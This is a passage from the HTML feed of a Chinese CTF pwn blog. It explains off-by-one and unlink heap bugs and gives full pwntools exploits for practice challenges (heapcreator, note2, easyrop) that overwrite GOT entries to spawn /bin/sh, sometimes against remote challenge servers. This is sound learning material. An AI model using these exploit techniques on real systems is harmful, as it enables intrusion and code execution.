class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment">#r = process(&#x27;./mrctf2020_easyrop&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25663</span>)<br>system_sh =<span class="hljs-number">0x000000000040072A</span><br>r.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x300</span>)<br>r.sendline(<span class="hljs-string">b&#x27;7&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>* <span class="hljs-number">0x12</span> + p64(system_sh))<br>r.interactive()<br></code></pre></td></tr></table></figure><p>但是不加sleep无法通过</p><p>有人说是python同时发送多个字符串时会合并(?)</p><p>那什么时候情况下需要在sendline前面加一个sleep</p><p>​    [已解决] 打本地不加应该没事，打远程的时候肯定会有一点延迟，假如没有sendafter这一类的发送，就可能会造成后面的也一起发送了，所以每次写exp发送的时候最好用sendafter或者sendlineafter这样的话就不需要再担心sleep(1)了</p><hr><h4 id="binwalk提取固件时快捷方式指向-dev-null"><a href="#binwalk提取固件时快捷方式指向-dev-null" class="headerlink" title="binwalk提取固件时快捷方式指向/dev/null"></a>binwalk提取固件时快捷方式指向/dev/null</h4><p>binwalk提取固件时会有一个warning</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">WARNING: Symlink points outside of the extraction directory: <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>dir815_FW_101<span class="hljs-regexp">/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/</span>squashfs-root<span class="hljs-regexp">/htdocs/</span>web<span class="hljs-regexp">/dlcfg.cgi -&gt; /</span>htdocs<span class="hljs-regexp">/cgibin; changing link target to /</span>dev/<span class="hljs-keyword">null</span> <span class="hljs-keyword">for</span> security purposes.<br></code></pre></td></tr></table></figure><p>用到这个快捷方式时要修改一下</p><h4 id="sendlineafter的问题"><a href="#sendlineafter的问题" class="headerlink" title="sendlineafter的问题"></a>sendlineafter的问题</h4><p>要加上换行符<code>\n</code>，否则匹配不上</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.sendlineafter</span>(b<span class="hljs-string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,...)<br></code></pre></td></tr></table></figure><h4 id="python调用c库函数"><a href="#python调用c库函数" class="headerlink" title="python调用c库函数"></a>python调用c库函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>libc.srand(<span class="hljs-number">0</span>)<br>libc.rand()%<span class="hljs-number">6</span> + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>Others</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Off-By-One</title>
    <link href="/2022/11/27/ctf-pwn/Off-By-One/"/>
    <url>/2022/11/27/ctf-pwn/Off-By-One/</url>
    
    <content type="html"><![CDATA[<h4 id="Off-By-One漏洞如何产生"><a href="#Off-By-One漏洞如何产生" class="headerlink" title="Off-By-One漏洞如何产生"></a>Off-By-One漏洞如何产生</h4><ol><li><p>循环多一次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C">x = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">10</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">10</span>;i++)<br>&#123;<br>    x[i] = getchar();<br>&#125;<br></code></pre></td></tr></table></figure><p>x的下一个chunk第一个字节被溢出了</p></li><li><p><code>strlen</code>和<code>strcpy</code>行为不一致</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)==<span class="hljs-number">100</span>)<br>&#123;<br>    <span class="hljs-built_in">strcpy</span>(chunk,buffer);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>strlen</code>返回值不算结束符’<code>\0</code>，而<code>strcpy</code>复制时会把结束符在内的101个字符复制过去</p></li></ol><h4 id="hitcon-creator"><a href="#hitcon-creator" class="headerlink" title="hitcon_creator"></a>hitcon_creator</h4><p>题目来源</p><p><a href="https://buuoj.cn/challenges#hitcontraining_heapcreator">https://buuoj.cn/challenges#hitcontraining_heapcreator</a></p><h5 id="1-create"><a href="#1-create" class="headerlink" title="1. create"></a>1. create</h5><p><img src="/img/off_by_one/1.png"></p><p>从上述结构可以推断出heaparray是如下结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">heaparray_item</span>&#123;</span><br>    int_64   size;<br>    <span class="hljs-type">char</span> * content;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">heaparray_item</span> * <span class="hljs-title">heaparray</span>[10];</span><br></code></pre></td></tr></table></figure><h5 id="2-edit"><a href="#2-edit" class="headerlink" title="2. edit"></a>2. edit</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ( *(&amp;heaparray + v1) )<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content of heap : &quot;</span>);<br>    read_input(*((_QWORD *)*(&amp;heaparray + v1) + <span class="hljs-number">1</span>), *(_QWORD *)*(&amp;heaparray + v1) + <span class="hljs-number">1LL</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done !&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>read_input</code>读取size+1字节，出现了off_by_one漏洞</p><p>可以覆盖下一个chunk的size字段</p><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ol><li><p>申请三个堆块，大小为0x18,0x10,0x10，加上三次size申请的0x10，一共6个chunk</p><p> <img src="/img/off_by_one/2.jpg"></p></li><li><p>修改0号块，写入<code>/bin/sh</code>，然后再溢出<code>0x81</code>到下一个chunk的size</p><p><img src="/img/off_by_one/3.jpg"></p></li><li><p>这时delete chunk 1，会合并到前一个chunk（也就是1的size所在chunk）中</p><p> <img src="/img/off_by_one/4.jpg"></p><p> 观察bins，发现这个chunk被free到fastbin的0x80节点上（0x20上也有一个chunk是因为delete也会将size释放掉）</p><p> <img src="/img/off_by_one/5.jpg"></p></li><li><p>申请一个新的chunk，将0x80这个块申请出来，因此malloc的大小需要为0x70</p><p> 同时，在2号的content位置写入<code>free@got</code></p><p> 这时调用show(2)会泄露free的地址</p><p> <img src="/img/off_by_one/6.jpg"></p></li><li><p>泄露libc基址找到system地址</p></li><li><p><code>edit(2,p64(system_addr))</code>时，会修改content指针指向的内容，而content指针被<code>free@got</code>替换掉了，所以free的got表被修改成了<code>system@got</code>上的地址</p></li><li><p>然后<code>delete(0)</code>时，首先要free掉<code>heaparray[0].content</code>上的内容，但是由于free被替换成了system，结果就变成了以content指针为参数调用system函数的情况，而<code>heaparray[0].content</code>恰好是之前写过的<code>/bin/sh</code>，因此执行了`system(‘/bin/sh’)</p></li></ol><h5 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h5><blockquote><p>libcsearcher挑版本为2.23的</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br><span class="hljs-comment">#r = remote(&#x27;node4.buuoj.cn&#x27;,26117)</span><br>elf = ELF(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    r.sendlineafter(<span class="hljs-string">&quot;heap:&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    r.sendlineafter(<span class="hljs-string">&quot;heap : &quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x81&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>add(<span class="hljs-number">0x70</span>,p64(<span class="hljs-number">1</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x8</span>)+p64(free_got))<br>show(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>free_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#libc</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>,free_addr)<br>offset = free_addr-libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br>system_addr = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>edit(<span class="hljs-number">2</span>,p64(system_addr))<br><span class="hljs-comment">#gdb.attach(r)</span><br>delete(<span class="hljs-number">0</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>patchelf修改libc版本</title>
    <link href="/2022/11/27/ctf-pwn/patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8Flibc%E7%89%88%E6%9C%AC/"/>
    <url>/2022/11/27/ctf-pwn/patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8Flibc%E7%89%88%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h4 id="安装glibc-all-in-one"><a href="#安装glibc-all-in-one" class="headerlink" title="安装glibc-all-in-one"></a>安装glibc-all-in-one</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/matrix1001/glibc-all-in-one<br>cd glibc-all-in-one<br>./update_list<br>cat list <br>./download &lt;libc-in-list&gt;<br></code></pre></td></tr></table></figure><h4 id="修改libc-so和ld-so"><a href="#修改libc-so和ld-so" class="headerlink" title="修改libc.so和ld.so"></a>修改libc.so和ld.so</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">patchelf --set-interpreter ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so  &lt;path-to-elf&gt;<br><br>patchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6  &lt;path-to-elf&gt;<br><span class="hljs-comment"># param1 : old libc.so</span><br><span class="hljs-comment"># param2 : new libc.so</span><br><span class="hljs-comment"># param3 : path to elf</span><br></code></pre></td></tr></table></figure><h4 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h4><p><img src="/img/patchelf/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unlink</title>
    <link href="/2022/11/25/ctf-pwn/unlink/"/>
    <url>/2022/11/25/ctf-pwn/unlink/</url>
    
    <content type="html"><![CDATA[<p>原理</p><blockquote><p>以下内容一律假设 sz = 4 bytes  ，32位系统</p></blockquote><h4 id="unlink时向任意地址写入数据原理"><a href="#unlink时向任意地址写入数据原理" class="headerlink" title="unlink时向任意地址写入数据原理"></a>unlink时向任意地址写入数据原理</h4><p>假设需要从bin中摘除一个<strong>首地址为P</strong>的chunk</p><p>32位系统下，fd相对于块首的偏移为8（prevsize和size都是4字节），bk偏移为12</p><p>即 <code>fd = P+8 </code> ，<code>bk = P+12</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// unlink时需要 将P.fd指向的块的bk 赋值为 P.bk上的值</span><br>*(*(P+<span class="hljs-number">8</span>)+<span class="hljs-number">12</span>) = *(P+<span class="hljs-number">12</span>)<br><span class="hljs-comment">// 将P.bk指向的块的fd 赋值为 P.fd上的值</span><br>*(*(P+<span class="hljs-number">12</span>)+<span class="hljs-number">8</span>) = *(P+<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>假设想要向0x4000000C这个地址上写入0xdeadbeef这个值</p><p>只需将<code>*(P+8)</code>赋值为0x40000000，将<code>*(P+12)</code>赋值为0xdeadbeef，在unlink时就会完成赋值</p><p>这种方法是将fd设置为了target addr - 12 ，bk设置为了expect value</p><blockquote><p>也可以将fd设置为expect value，bk设置为target addr - 8，但是后文默认均使用前一种攻击方法</p></blockquote><p>unlink漏洞同时向两个地址进行了写入，所以在保证targe taddr -12 可以写入的同时，也要保证expect value + 8 有写入权限</p><h4 id="上面这些都没用"><a href="#上面这些都没用" class="headerlink" title="上面这些都没用"></a>上面这些都没用</h4><p><img src="/img/unlink/1.jpg"></p><h4 id="加入检查机制之后"><a href="#加入检查机制之后" class="headerlink" title="加入检查机制之后"></a>加入检查机制之后</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C">FD = P-&gt;fd;<br>BK = P-&gt;bk;<br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                      <br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV); <br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure><p>因此溢出时需要额外保证以下条件</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">*(<span class="hljs-name">*</span>(<span class="hljs-name">P+8</span>) <span class="hljs-number">+12</span>) == P<br>*(<span class="hljs-name">*</span>(<span class="hljs-name">P+12</span>)+ <span class="hljs-number">8</span>) == P<br></code></pre></td></tr></table></figure><p>所以需要找到堆管理列表里面指向chunk P的指针<strong>ptr</strong>，让P的fd指向ptr-12，P的bk指向ptr-8，这样P-&gt;fd-&gt;bk指向P，P-&gt;bk-&gt;fd也指向P。</p><p>绕过if判断之后，下面两条赋值语句首先将 FD-&gt;bk（也就是ptr）指向了BK，再将BK-&gt;fd（还是ptr，又改变了一次ptr）指向了FD。</p><p>因此后面这两条赋值语句确实完成了FD和BK unlink 的效果，唯一被改变的是ptr，它从原本指向chunk p，变成了*(ptr - 12)</p><h3 id="zctf2016-note2"><a href="#zctf2016-note2" class="headerlink" title="zctf2016_note2"></a>zctf2016_note2</h3><p><strong>需要注意的是unlink的fakechunk大小不能小于max fastbin，因为fastbin里的根本没有把下一个inuse bit置零，也就不会存在unlink</strong></p><p>使用了one gadget，还有覆盖atoi的got表都成功了，但是覆盖free的got表，再delete(2)却不能成功，不知道原因</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./note2&quot;)</span><br>e = ELF(<span class="hljs-string">&quot;./note2&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">25956</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;)&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, choice, content</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">&quot;]&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(choice).encode())<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br>p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;abc&quot;</span>) <span class="hljs-comment"># name</span><br>p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;def&quot;</span>) <span class="hljs-comment"># addr</span><br><br>ptr = <span class="hljs-number">0x602120</span><br>fd = ptr - <span class="hljs-number">0x18</span><br>bk = ptr - <span class="hljs-number">0x10</span><br><br>new(<span class="hljs-number">0x80</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xa1</span>) + p64(fd) + p64(bk) )<br>new(<span class="hljs-number">0x0</span>,  <span class="hljs-string">b&#x27;\x01&#x27;</span> * <span class="hljs-number">0x10</span>)  <br>new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <br><br>delete(<span class="hljs-number">1</span>)<br>new(<span class="hljs-number">0x0</span>, <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">16</span> + p64(<span class="hljs-number">0xa0</span>) + p64(<span class="hljs-number">0x90</span>))  <span class="hljs-comment"># overflow </span><br><br>delete(<span class="hljs-number">2</span>) <span class="hljs-comment"># unlink</span><br><br>free_got = e.got[<span class="hljs-string">&quot;free&quot;</span>]<br>atoi_got = e.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>edit(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\x03&#x27;</span> * <span class="hljs-number">0x18</span> + p64(atoi_got))<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Content is &quot;</span>)<br><br>atoi = u64(p.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&quot;atoi :&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(atoi)))<br><br><br><span class="hljs-comment"># # local </span><br><span class="hljs-comment">#libc = ELF(&quot;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&quot;)</span><br><span class="hljs-comment">#libc.address =  atoi - libc.sym[&#x27;atoi&#x27;]</span><br><span class="hljs-comment">#system = libc.sym[&quot;system&quot;]</span><br><span class="hljs-comment">#log.info(&quot;system :&quot; + str(hex(system)))</span><br><span class="hljs-comment"># one_gadget :</span><br><span class="hljs-comment">#system = libc.address + 0xef9f4 </span><br><br><span class="hljs-comment"># remote</span><br>libc = LibcSearcher(<span class="hljs-string">&quot;atoi&quot;</span>, atoi)<br>offset = atoi - libc.dump(<span class="hljs-string">&#x27;atoi&#x27;</span>)<br>system = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>edit(<span class="hljs-number">0</span>, <span class="hljs-number">1</span> , p64(system))<br><br>p.interactive() <span class="hljs-comment"># input /bin/sh</span><br></code></pre></td></tr></table></figure><h3 id="ZJCTF2019-EasyHeap"><a href="#ZJCTF2019-EasyHeap" class="headerlink" title="ZJCTF2019 EasyHeap"></a>ZJCTF2019 EasyHeap</h3><p><a href="https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap">https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap</a></p><p>很明显在<code>ceate_heap</code>中size并没有存下来，然后<code>edit_heap</code>时也是用户自己输入size来编辑</p><p>因此可以溢出</p><p>checksec发现没有开启PIE，heaparray的地址可以直接使用</p><ol><li><p>首先申请三个chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>构造一个unlink需要在第一个chunk内构造一个fakechunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_chunk = p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(heaparray_addr-<span class="hljs-number">0x18</span>) + p64(heaparray_addr-<span class="hljs-number">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0xa0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,fake_chunk)<br></code></pre></td></tr></table></figure><p><img src="/img/%5BZJCTF2019%5DEasyHeap/1.jpg"></p><p>对于chunk 0，<code>fd = heaparray - 0x18</code> <code>bk = heaparray - 0x10</code>，unlink chunk 0 时会将heaparray[0]指向<code>heaparray - 0x18</code></p></li><li><p>这时delete(1)，会将chunk 1 和 fakechunk 合并起来放入 unsorted bin</p><p><img 